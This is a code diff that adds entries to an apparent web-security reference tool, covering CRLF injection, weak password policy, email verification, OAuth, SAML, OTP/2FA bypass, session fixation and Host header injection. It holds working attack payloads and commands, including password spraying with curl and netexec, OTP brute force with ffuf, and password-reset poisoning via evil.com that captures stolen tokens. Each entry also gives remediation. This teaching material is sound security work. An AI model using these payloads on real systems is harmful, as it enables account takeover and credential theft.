@@ -26,6 +26,46 @@ var VULNS = [
     category: "Injection",
     vulns: [
       {
+        "id": "crlf-injection",
+        "name": "CRLF / HTTP Response Header Injection",
+        "severity": "Medium",
+        "ref": "https://owasp.org/www-community/vulnerabilities/CRLF_Injection",
+        "description": "Unsanitised newline characters (CR / LF) in user input are written into HTTP headers or other structured output, letting an attacker inject headers or split the response.",
+        "brief": "HTTP headers are separated by CRLF (\\r\\n, or %0d%0a URL-encoded). When a value the user controls — a redirect target, a cookie, an email field — is placed into a header without stripping newlines, an attacker can inject their own headers or split the message entirely. Depending on where the sink is, this becomes response header injection, response splitting, cookie injection, log forging, or — in email flows — SMTP header injection to add a hidden CC/BCC.\n\nImpact ranges from adding an attacker CC to a password-reset email, to setting cookies, to XSS and cache poisoning via a split response.",
+        "quickReference": [
+          { "label": "Header injection", "cmd": "param=value%0d%0aX-Injected:%20true" },
+          { "label": "Set a cookie", "cmd": "param=value%0d%0aSet-Cookie:%20sessionid=attacker" },
+          { "label": "Email CC injection (reset flows)", "cmd": "email=victim@mail.com%0d%0acc:attacker@mail.com" },
+          { "label": "Open redirect + split", "cmd": "?url=%0d%0aLocation:%20https://evil.com" }
+        ],
+        "sections": [
+          { "title": "How It's Exploited", "type": "commands", "commands": [
+            { "label": "1. Find a value reflected into a header", "cmd": "# redirects (Location), Set-Cookie, custom headers, and any 'echo the input' header\ncurl -si 'https://target/redirect?url=test' | grep -i location" },
+            { "label": "2. Inject a newline and a header", "cmd": "curl -si 'https://target/redirect?url=test%0d%0aX-Injected:%20yes'\n# X-Injected present in the response = CRLF injection" },
+            { "label": "3. Escalate the sink", "cmd": "# Set-Cookie:  ...%0d%0aSet-Cookie:%20sessionid=attacker   (session fixation)\n# full body:   ...%0d%0a%0d%0a<script>alert(1)</script>       (response splitting -> XSS)\n# cache:       poison a cached response with attacker headers/body" },
+            { "label": "4. SMTP header injection in mail flows", "cmd": "# a reset/contact form that builds mail headers from input:\nemail=victim@mail.com%0d%0acc:attacker@mail.com\n# you receive a copy of the victim's reset token" }
+          ]},
+          { "title": "Sinks & Effects", "type": "table", "columns": ["Sink", "Effect"], "rows": [
+            ["Location header (redirect)", "Header injection, open redirect, response splitting"],
+            ["Set-Cookie", "Session fixation, cookie tampering"],
+            ["Reflected custom header", "Cache poisoning, client-side attacks"],
+            ["Email headers (To/CC/Subject)", "SMTP injection — hidden CC/BCC, spoofed mail"],
+            ["Log files", "Log forging / injection to hide or fake activity"]
+          ]},
+          { "title": "References", "type": "references", "items": [
+            { "label": "OWASP — CRLF Injection", "url": "https://owasp.org/www-community/vulnerabilities/CRLF_Injection" },
+            { "label": "OWASP — HTTP Response Splitting", "url": "https://owasp.org/www-community/attacks/HTTP_Response_Splitting" }
+          ]},
+          { "title": "Remediation", "type": "notes", "items": [
+            "Strip or reject CR (%0d) and LF (%0a) — and their encoded/overlong variants — from any value that reaches a header, cookie, redirect, email field, or log line.",
+            "Use framework APIs that build headers and set cookies safely rather than string-concatenating raw values.",
+            "Prefer allow-list validation for redirect targets and email addresses over blocklist filtering.",
+            "Keep modern web servers/frameworks updated — most now reject bare CR/LF in header values by default.",
+            "Encode data written into logs so injected newlines cannot forge log entries."
+          ]}
+        ]
+      },
+      {
         id: "sqli",
         name: "SQL Injection (SQLi)",
         severity: "Critical",
@@ -979,6 +1019,242 @@ var VULNS = [
     category: "Access Control & Authentication",
     vulns: [
       {
+        "id": "weak-password-policy",
+        "name": "Weak Password Policy",
+        "severity": "Medium",
+        "ref": "https://owasp.org/www-community/vulnerabilities/Weak_password_requirements",
+        "description": "The application accepts weak, common, or predictable passwords, making accounts easy to guess or brute-force.",
+        "brief": "A password policy is the set of rules an application enforces on the passwords users choose. It is weak when it permits short passwords, common passwords (password, 123456, the username itself), or has no defence against automated guessing. The problem is compounded when the rules are only enforced in the browser and never re-checked on the server.\n\nImpact: weak policies turn a leaked username list into compromised accounts through credential stuffing, password spraying, and simple online guessing — the single most common cause of account takeover.",
+        "quickReference": [
+          { "label": "Try obviously weak passwords", "cmd": "password, 123456, qwerty12, <username>, <company>123, Password1!" },
+          { "label": "Check where the rule is enforced", "cmd": "# strip client-side JS validation, submit a 1-char password directly to the API" },
+          { "label": "Spray one password across many users", "cmd": "for u in $(cat users.txt); do curl -s -d \"user=$u&pass=Winter2024!\" https://target/login; done" }
+        ],
+        "sections": [
+          { "title": "How It's Tested", "type": "commands", "commands": [
+            { "label": "1. Probe the accepted complexity server-side", "cmd": "# bypass the browser and post directly to the registration/change-password API\ncurl -s -X POST https://target/register -d 'email=t@t.com&password=a'\n# accepted 1-char password = no server-side policy" },
+            { "label": "2. Try known-weak and context passwords", "cmd": "# common list + words from the site (company name, product, season+year)\npassword, 123456, 111111, abcabc, qwerty12, <username>, <company>2024" },
+            { "label": "3. Password spraying (one password, many users)", "cmd": "# slow and wide beats fast and narrow — avoids per-account lockout\nnetexec http target -u users.txt -p 'Spring2024!' --continue-on-success\n# web: replay the login request in Burp Intruder across the username list" }
+          ]},
+          { "title": "What a Weak Policy Allows", "type": "table", "columns": ["Weakness", "Consequence"], "rows": [
+            ["No minimum length / very short", "Fast offline and online brute force"],
+            ["No common-password blocklist", "Credential stuffing and spraying succeed"],
+            ["username == password permitted", "Trivial mass compromise"],
+            ["No rate limit or lockout", "Unlimited online guessing"],
+            ["Client-side-only enforcement", "Policy bypassed by posting to the API directly"]
+          ]},
+          { "title": "References", "type": "references", "items": [
+            { "label": "OWASP — Weak Password Requirements", "url": "https://owasp.org/www-community/vulnerabilities/Weak_password_requirements" },
+            { "label": "NIST SP 800-63B — Authenticator (password) guidance", "url": "https://pages.nist.gov/800-63-3/sp800-63b.html" }
+          ]},
+          { "title": "Remediation", "type": "notes", "items": [
+            "Enforce a minimum length (12+ characters) and check candidates against a breached-password blocklist (e.g. Have I Been Pwned Pwned Passwords).",
+            "Always validate the policy server-side; client-side checks are a UX aid only.",
+            "Rate-limit and lock out (or step up with CAPTCHA/MFA) after repeated failures, per account and per source.",
+            "Prefer length and passphrases over arbitrary composition rules, and encourage a password manager.",
+            "Layer multi-factor authentication so a guessed password alone is not enough."
+          ]}
+        ]
+      },
+      {
+        "id": "email-verification",
+        "name": "Insufficient Email Verification",
+        "severity": "Medium",
+        "ref": "https://cwe.mitre.org/data/definitions/287.html",
+        "description": "The application trusts an email address before it is proven to belong to the user, enabling account takeover and abuse.",
+        "brief": "Many flows assume the person registering, or changing their address, actually controls that mailbox. When verification is missing, skippable, or bypassable, an attacker can bind an account to a victim's address, use an unverified account for privileged actions, or pre-register a victim's email so a later legitimate signup merges into the attacker's account (pre-account-takeover).\n\nImpact: account takeover, spoofed identity, spam and abuse from unverified accounts, and privilege inheritance where an email domain grants trust (e.g. @company.com auto-joins an internal tenant).",
+        "quickReference": [
+          { "label": "Is the account usable before verifying?", "cmd": "# register, DON'T click the link, then try to log in / act" },
+          { "label": "Null-byte / encoding trick", "cmd": "victim@target.com%00@attacker.com   (validation reads one part, delivery another)" },
+          { "label": "Pre-account-takeover", "cmd": "# register victim@corp.com first; wait for them to sign in via SSO -> merges into your account" },
+          { "label": "Change-email without re-verify", "cmd": "# change address; is the new one trusted before the confirmation link is clicked?" }
+        ],
+        "sections": [
+          { "title": "How It's Exploited", "type": "commands", "commands": [
+            { "label": "1. Skip verification entirely", "cmd": "# create the account, never confirm, then exercise authenticated features\n# if it works, verification is decorative" },
+            { "label": "2. Smuggle a second address past validation", "cmd": "# the validator checks the first token, the mailer sends to the second:\nvictim@target.com%00@attacker.com\nvictim@target.com%0a@attacker.com\n\"victim@target.com\"@attacker.com" },
+            { "label": "3. Pre-account-takeover via SSO merge", "cmd": "# 1) attacker registers a local account with victim@corp.com (no verify enforced)\n# 2) victim later 'Sign in with Google' using the same address\n# 3) app merges the identities -> attacker keeps their known password" },
+            { "label": "4. Trust an unverified corporate domain", "cmd": "# register bob@target.com — does it auto-join the target's internal workspace/tenant?" }
+          ]},
+          { "title": "Where It Bites", "type": "table", "columns": ["Scenario", "Impact"], "rows": [
+            ["Account usable pre-verification", "Spam/abuse accounts, bypassed onboarding controls"],
+            ["Email bound to a victim address", "Password reset then flows to the account = takeover"],
+            ["Pre-account-takeover + SSO merge", "Persistent access after the victim joins"],
+            ["Domain-based auto-trust", "Unauthorised access to internal tenants/roles"]
+          ]},
+          { "title": "References", "type": "references", "items": [
+            { "label": "PortSwigger — Authentication vulnerabilities", "url": "https://portswigger.net/web-security/authentication" },
+            { "label": "Microsoft/Okta — pre-account-takeover research", "url": "https://portswigger.net/daily-swig/account-takeover" }
+          ]},
+          { "title": "Remediation", "type": "notes", "items": [
+            "Require a verified email before the account can perform any meaningful or privileged action.",
+            "Re-verify on every email change, and do not trust the new address until the confirmation link is used.",
+            "Normalise and strictly parse addresses (reject null bytes, CRLF, multiple @, and quoted local parts) before storing or mailing.",
+            "When linking social/SSO identities, match on a verified email only, and never silently merge a local account into an SSO login.",
+            "Do not grant trust or tenant membership from an email domain without an out-of-band check."
+          ]}
+        ]
+      },
+      {
+        "id": "oauth-misconfig",
+        "name": "OAuth Misconfiguration",
+        "severity": "High",
+        "ref": "https://portswigger.net/web-security/oauth",
+        "description": "Flaws in an OAuth 2.0 / OIDC implementation — loose redirect URIs, missing state, or weak token handling — lead to account takeover.",
+        "brief": "OAuth 2.0 delegates authentication/authorisation to a provider (Google, Facebook, an internal IdP). The security of the flow rests on a few checks: an exact-match redirect_uri, an unguessable and validated state parameter, and correct validation of the code/token and its audience. When any of these is loose, an attacker can steal authorization codes or tokens, or graft their identity onto a victim's session.\n\nImpact: full account takeover, login CSRF, and cross-account access — often without the victim entering any credentials on the attacker's site.",
+        "quickReference": [
+          { "label": "redirect_uri open/loose", "cmd": "redirect_uri=https://target.com.evil.com  or  //evil.com  or  /path/../evil — does it still send the code?" },
+          { "label": "Missing / unvalidated state", "cmd": "# drop or fix the state param -> login CSRF (attach attacker's code to victim session)" },
+          { "label": "Code/token leak via Referer", "cmd": "# ?code=... in the URL leaking to third-party scripts on the callback page" },
+          { "label": "Implicit-flow token in fragment", "cmd": "#access_token=... in the URL fragment on a page you can influence" }
+        ],
+        "sections": [
+          { "title": "How It's Exploited", "type": "commands", "commands": [
+            { "label": "1. Hijack the code via a loose redirect_uri", "cmd": "# if the provider allows anything but an exact match, point it at your host:\nhttps://provider/authorize?client_id=X&redirect_uri=https://target.evil.com/cb&response_type=code&scope=...\n# the victim's authorization code is delivered to evil.com -> exchange it for their session" },
+            { "label": "2. Login CSRF via missing state", "cmd": "# obtain YOUR code, then force the victim's browser to the callback with it:\nhttps://target/oauth/callback?code=<attacker_code>\n# victim is now logged into the attacker's account and adds data/cards to it" },
+            { "label": "3. Steal the token from the URL", "cmd": "# implicit flow puts #access_token in the fragment; an open redirect or XSS on\n# the callback path, or a leaky Referer, exfiltrates it" },
+            { "label": "4. Account linking without email verification", "cmd": "# link 'Sign in with Google' to an existing account by unverified email -> takeover" }
+          ]},
+          { "title": "Key Checks", "type": "table", "columns": ["Control", "What to verify"], "rows": [
+            ["redirect_uri", "Exact string match against a registered allow-list; no wildcards, path tricks, or subdomains"],
+            ["state", "Present, unguessable, bound to the session, and validated on return"],
+            ["nonce (OIDC)", "Present and checked to bind the ID token to the request"],
+            ["Authorization code", "Single-use, short-lived, exchanged over the back channel (PKCE for public clients)"],
+            ["Token audience/issuer", "aud and iss validated so a token for another client can't be replayed"],
+            ["Account linking", "Only on a verified email; never silently merge identities"]
+          ]},
+          { "title": "References", "type": "references", "items": [
+            { "label": "PortSwigger — OAuth 2.0 authentication vulnerabilities", "url": "https://portswigger.net/web-security/oauth" },
+            { "label": "OAuth 2.0 Security Best Current Practice (RFC 9700)", "url": "https://datatracker.ietf.org/doc/html/rfc9700" }
+          ]},
+          { "title": "Remediation", "type": "notes", "items": [
+            "Register and enforce exact redirect_uri values — no wildcards, no partial matches.",
+            "Always generate, bind, and validate a random state parameter (and nonce for OIDC).",
+            "Use the authorization-code flow with PKCE; avoid the implicit flow entirely.",
+            "Validate the token's signature, issuer, audience, and expiry before trusting it.",
+            "Link social identities only on a verified email, and require explicit user confirmation."
+          ]}
+        ]
+      },
+      {
+        "id": "saml-flaws",
+        "name": "SAML Authentication Flaws",
+        "severity": "High",
+        "ref": "https://portswigger.net/web-security/saml",
+        "description": "Weak validation of SAML assertions — especially signature handling — lets an attacker forge authentication as any user.",
+        "brief": "SAML carries a signed XML assertion from an Identity Provider to a Service Provider stating who the user is. The whole trust model depends on the SP correctly validating that signature and the assertion's contents. Because XML signing is subtle, SPs frequently mis-validate — accepting unsigned assertions, allowing XML Signature Wrapping (XSW), or trusting attacker-controlled fields — which lets an attacker rewrite the NameID and log in as anyone, including administrators.\n\nImpact: complete authentication bypass and privilege escalation across every application behind the SSO.",
+        "quickReference": [
+          { "label": "Decode the SAMLResponse", "cmd": "echo '<b64>' | base64 -d | xmllint --format -   # (URL-decode first if needed)" },
+          { "label": "Change the identity", "cmd": "edit  <NameID>admin@target.com</NameID>  and resend — accepted without a valid signature?" },
+          { "label": "Signature stripping", "cmd": "remove the <Signature> element entirely — does the SP still accept it?" },
+          { "label": "XML Signature Wrapping (XSW)", "cmd": "keep the signed assertion but add a second, unsigned, attacker-controlled one" }
+        ],
+        "sections": [
+          { "title": "How It's Exploited", "type": "commands", "commands": [
+            { "label": "1. Capture and decode the response", "cmd": "# intercept the POST to the SP's ACS endpoint, grab SAMLResponse, then:\necho '<SAMLResponse b64>' | base64 -d | xmllint --format -" },
+            { "label": "2. Tamper the assertion", "cmd": "# change the asserted identity and replay:\n<saml:NameID>administrator@target.com</saml:NameID>\n# base64/deflate + re-encode and send — accepted = broken validation" },
+            { "label": "3. Signature exclusion / stripping", "cmd": "# delete the <ds:Signature> node; a SP that only validates 'if a signature is present'\n# will accept the now-unsigned, attacker-modified assertion" },
+            { "label": "4. XML Signature Wrapping", "cmd": "# use the SAML Raider Burp extension: keep the original signed assertion so the\n# signature verifies, but inject a second assertion the SP actually reads" }
+          ]},
+          { "title": "Common Weaknesses", "type": "table", "columns": ["Flaw", "Effect"], "rows": [
+            ["Assertion accepted without a signature", "Forge any identity outright"],
+            ["Signature not tied to the read element (XSW)", "Inject an unsigned assertion beside the signed one"],
+            ["No audience / recipient / timestamp checks", "Replay assertions across apps or after expiry"],
+            ["XML comment in NameID (e.g. admin<!---->@x)", "Parser truncation changes the effective identity"],
+            ["Trusting IdP-supplied Issuer/URLs blindly", "SSRF and open-redirect style abuse"]
+          ]},
+          { "title": "References", "type": "references", "items": [
+            { "label": "PortSwigger — SAML security", "url": "https://portswigger.net/web-security/saml" },
+            { "label": "SAML Raider (Burp extension)", "url": "https://github.com/CompassSecurity/SAMLRaider" }
+          ]},
+          { "title": "Remediation", "type": "notes", "items": [
+            "Require a valid signature and reject any assertion that is unsigned or whose signature does not cover the exact element being read.",
+            "Use a hardened, well-maintained SAML library rather than hand-rolled XML parsing, and keep it patched.",
+            "Validate Audience, Recipient, NotBefore/NotOnOrAfter, and InResponseTo on every assertion.",
+            "Canonicalise safely and reject documents with unexpected extra assertions or XML comments in identity fields.",
+            "Pin the IdP's signing certificate and rotate it through a controlled process."
+          ]}
+        ]
+      },
+      {
+        "id": "otp-2fa-bypass",
+        "name": "OTP / 2FA Bypass",
+        "severity": "High",
+        "ref": "https://portswigger.net/web-security/authentication/multi-factor",
+        "description": "The one-time-code or second-factor step can be brute-forced, skipped, or bypassed, defeating multi-factor authentication.",
+        "brief": "One-time passwords and second factors are only as strong as the checks around them. Common failures include short numeric codes with no attempt limit (brute-forceable), the ability to reach the post-2FA state without completing the step (flow skipping), trusting a client-controlled response, and race conditions that accept a code more than once. Any of these reduces 'two-factor' back to just the password.\n\nImpact: complete bypass of MFA, leading to account takeover even when the password is known to be protected by a second factor.",
+        "quickReference": [
+          { "label": "Brute force a short code", "cmd": "# 4-6 digit code, no attempt limit -> Burp Intruder over 000000-999999 in the OTP window" },
+          { "label": "Skip the step", "cmd": "# after password, browse directly to the authenticated page / call the post-2FA endpoint" },
+          { "label": "Response manipulation", "cmd": "# submit a wrong code, change  {\"verified\":false}  ->  true  in the response" },
+          { "label": "Reuse / race the code", "cmd": "# send many verify requests in parallel; is one code accepted twice, or the limit skipped?" }
+        ],
+        "sections": [
+          { "title": "How It's Exploited", "type": "commands", "commands": [
+            { "label": "1. Brute force with no rate limit", "cmd": "# capture the verify request, then Intruder / ffuf across all codes:\nffuf -w codes.txt -X POST -d 'otp=FUZZ' -u https://target/2fa/verify -H 'Cookie: <pre-2fa session>'\n# a valid session that outlives many attempts = brute-forceable" },
+            { "label": "2. Flow skipping (broken state)", "cmd": "# 1) submit username+password -> receive a 'needs 2FA' session\n# 2) instead of verifying, request an authenticated page or the final /login/complete\n# if it succeeds, the 2FA gate is not enforced server-side" },
+            { "label": "3. Response / status manipulation", "cmd": "# submit an invalid code, then edit the response in Burp:\n#   HTTP/1.1 401  ->  200\n#   {\"success\":false} -> {\"success\":true}\n# a client that trusts the response lets you in" },
+            { "label": "4. Reuse, race, and backup-code abuse", "cmd": "# fire N parallel verify requests (race) to accept one code multiple times;\n# also test whether old codes stay valid and whether backup codes are rate-limited" }
+          ]},
+          { "title": "Bypass Classes", "type": "table", "columns": ["Class", "Root cause"], "rows": [
+            ["Brute force", "Short code + no attempt limit + long validity window"],
+            ["Flow skipping", "Post-2FA state reachable without completing 2FA"],
+            ["Response manipulation", "Client trusts a server response the attacker can edit"],
+            ["Race condition", "Non-atomic verification accepts a code more than once"],
+            ["Weak reset/backup path", "Disable 2FA or recover via an unprotected channel"],
+            ["Code leakage", "OTP returned in a response, log, or predictable from a seed"]
+          ]},
+          { "title": "References", "type": "references", "items": [
+            { "label": "PortSwigger — Multi-factor authentication bypass", "url": "https://portswigger.net/web-security/authentication/multi-factor" },
+            { "label": "OWASP — Testing for Weaker Authentication in Alternative Channel", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel" }
+          ]},
+          { "title": "Remediation", "type": "notes", "items": [
+            "Strictly rate-limit and lock the OTP step, invalidate the code after a few failures, and keep the validity window short (30-60s for TOTP).",
+            "Enforce the 2FA requirement server-side on the session; never allow the authenticated state to be reached without it.",
+            "Make verification atomic and single-use to remove races and code reuse.",
+            "Never return the code or a trustable success flag to the client; decide server-side.",
+            "Protect the reset/backup and 'disable 2FA' paths with the same rigour as the primary factor."
+          ]}
+        ]
+      },
+      {
+        "id": "session-fixation",
+        "name": "Session Fixation",
+        "severity": "Medium",
+        "ref": "https://owasp.org/www-community/attacks/Session_fixation",
+        "description": "The session identifier is not regenerated at login, so an attacker who plants a known session id can ride the victim's authenticated session.",
+        "brief": "In a session-fixation attack the attacker first obtains or sets a valid session identifier, then tricks the victim into authenticating with that same identifier. Because the application keeps the pre-login session id after authentication instead of issuing a fresh one, the attacker's known id is now bound to the victim's logged-in session.\n\nImpact: full session hijacking and account takeover. The tell is simple — the session cookie value is identical before and after login.",
+        "quickReference": [
+          { "label": "The core test", "cmd": "# note the session cookie BEFORE login, authenticate, compare AFTER — same value = vulnerable" },
+          { "label": "Attacker sets the id", "cmd": "# can you set the session via a URL param or a settable cookie? ?sessionid=ATTACKER" },
+          { "label": "Fixate then hijack", "cmd": "# plant a known id in the victim's browser, wait for them to log in, reuse the id" }
+        ],
+        "sections": [
+          { "title": "How It's Exploited", "type": "commands", "commands": [
+            { "label": "1. Confirm the id survives login", "cmd": "# grab the pre-auth cookie:\ncurl -s -i https://target/login | grep -i set-cookie\n# log in reusing that exact cookie, then check the post-auth cookie is UNCHANGED" },
+            { "label": "2. Plant a known session id in the victim", "cmd": "# if the app accepts an attacker-supplied id (URL param, subdomain cookie, XSS):\nhttps://target/?sessionid=KNOWN123\n# or set a cookie for the parent domain from a sibling subdomain" },
+            { "label": "3. Hijack after the victim authenticates", "cmd": "# the victim logs in on KNOWN123; the attacker now uses KNOWN123 and is inside\ncurl -s https://target/account -b 'sessionid=KNOWN123'" }
+          ]},
+          { "title": "Enablers", "type": "table", "columns": ["Condition", "Why it matters"], "rows": [
+            ["No session regeneration on login", "The pre-login id becomes the authenticated id"],
+            ["Session id accepted from URL/param", "Attacker can set the id without any cookie access"],
+            ["Cookies scoped to the parent domain", "A sibling subdomain can fixate the cookie"],
+            ["Long session lifetime / no re-auth", "The fixated session stays useful for longer"]
+          ]},
+          { "title": "References", "type": "references", "items": [
+            { "label": "OWASP — Session fixation", "url": "https://owasp.org/www-community/attacks/Session_fixation" },
+            { "label": "OWASP — Session Management Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html" }
+          ]},
+          { "title": "Remediation", "type": "notes", "items": [
+            "Regenerate the session identifier on every privilege change, especially at login (and invalidate the old one).",
+            "Only accept session ids from a Secure, HttpOnly cookie — never from URL parameters or request bodies.",
+            "Scope cookies tightly (host-only where possible) so sibling subdomains cannot set them.",
+            "Set sensible idle and absolute session timeouts and require re-authentication for sensitive actions.",
+            "Bind sessions to reasonable attributes and invalidate them fully on logout."
+          ]}
+        ]
+      },
+      {
         id: "idor",
         name: "IDOR / Broken Access Control",
         severity: "High",
@@ -1378,6 +1654,46 @@ var VULNS = [
     {
     category: "Server-Side",
     vulns: [
+      {
+        "id": "host-header-injection",
+        "name": "Host Header Injection",
+        "severity": "Medium",
+        "ref": "https://portswigger.net/web-security/host-header",
+        "description": "The application trusts the client-supplied Host (or X-Forwarded-Host) header to build URLs or route logic, enabling poisoning and token theft.",
+        "brief": "The HTTP Host header is attacker-controllable, yet many applications reuse it to build absolute URLs — most damagingly the link in a password-reset email. If the reset URL is constructed from the Host or X-Forwarded-Host header, an attacker can request a reset for a victim while supplying their own host, so the email arrives with a link (carrying the victim's valid token) pointing at the attacker's server. The token leaks the moment the victim clicks.\n\nOther impacts include web-cache poisoning, routing to an unintended virtual host, and Host-based access-control bypass.",
+        "quickReference": [
+          { "label": "Password-reset poisoning", "cmd": "POST /reset  Host: evil.com        # reset link emailed to the victim points at evil.com" },
+          { "label": "Override header variant", "cmd": "X-Forwarded-Host: evil.com   (also X-Host, X-Forwarded-Server, Forwarded)" },
+          { "label": "Duplicate / ambiguous Host", "cmd": "Host: target.com\\r\\nHost: evil.com   (front-end reads one, back-end the other)" },
+          { "label": "Absolute-URL request line", "cmd": "GET https://target.com/  with  Host: evil.com" }
+        ],
+        "sections": [
+          { "title": "How It's Exploited", "type": "commands", "commands": [
+            { "label": "1. Confirm the Host is reflected / used", "cmd": "curl -s https://target/ -H 'Host: evil.com' | grep -i 'evil.com'\n# reflected into a link, redirect, or absolute URL = candidate" },
+            { "label": "2. Poison a password reset", "cmd": "POST /forgot-password HTTP/1.1\nHost: evil.com\n\nemail=victim@target.com\n# the victim receives a reset mail whose link is https://evil.com/reset?token=<victim token>" },
+            { "label": "3. Try override headers when Host is validated", "cmd": "POST /forgot-password HTTP/1.1\nHost: target.com\nX-Forwarded-Host: evil.com\n\nemail=victim@target.com" },
+            { "label": "4. Capture the token", "cmd": "# run a listener on evil.com; when the victim clicks, the token hits your logs:\n# GET /reset?token=eyJ...  -> use it to set the victim's password" }
+          ]},
+          { "title": "Impacts", "type": "table", "columns": ["Abuse", "Result"], "rows": [
+            ["Password-reset poisoning", "Reset token leaked -> account takeover"],
+            ["Web-cache poisoning", "Malicious absolute URLs served to other users"],
+            ["Routing / vhost confusion", "Reach an internal or unintended application"],
+            ["Host-based auth bypass", "Spoof a trusted host to reach restricted areas"],
+            ["SSRF-style callbacks", "Coerce server-side requests to an attacker host"]
+          ]},
+          { "title": "References", "type": "references", "items": [
+            { "label": "PortSwigger — HTTP Host header attacks", "url": "https://portswigger.net/web-security/host-header" },
+            { "label": "PortSwigger — Password reset poisoning", "url": "https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning" }
+          ]},
+          { "title": "Remediation", "type": "notes", "items": [
+            "Never build absolute URLs (especially reset/verification links) from the Host or X-Forwarded-Host header — use a server-side configured canonical domain.",
+            "Validate the incoming Host against an allow-list of expected domains and reject anything else.",
+            "Strip or ignore X-Forwarded-Host and similar override headers unless they come from a trusted, authenticated proxy.",
+            "Reject requests with duplicate or malformed Host headers.",
+            "Scope reset tokens tightly (short expiry, single use, bound to the account) to limit the damage if a link leaks."
+          ]}
+        ]
+      },
       {
         id: "ssrf",
         name: "Server-Side Request Forgery (SSRF)",
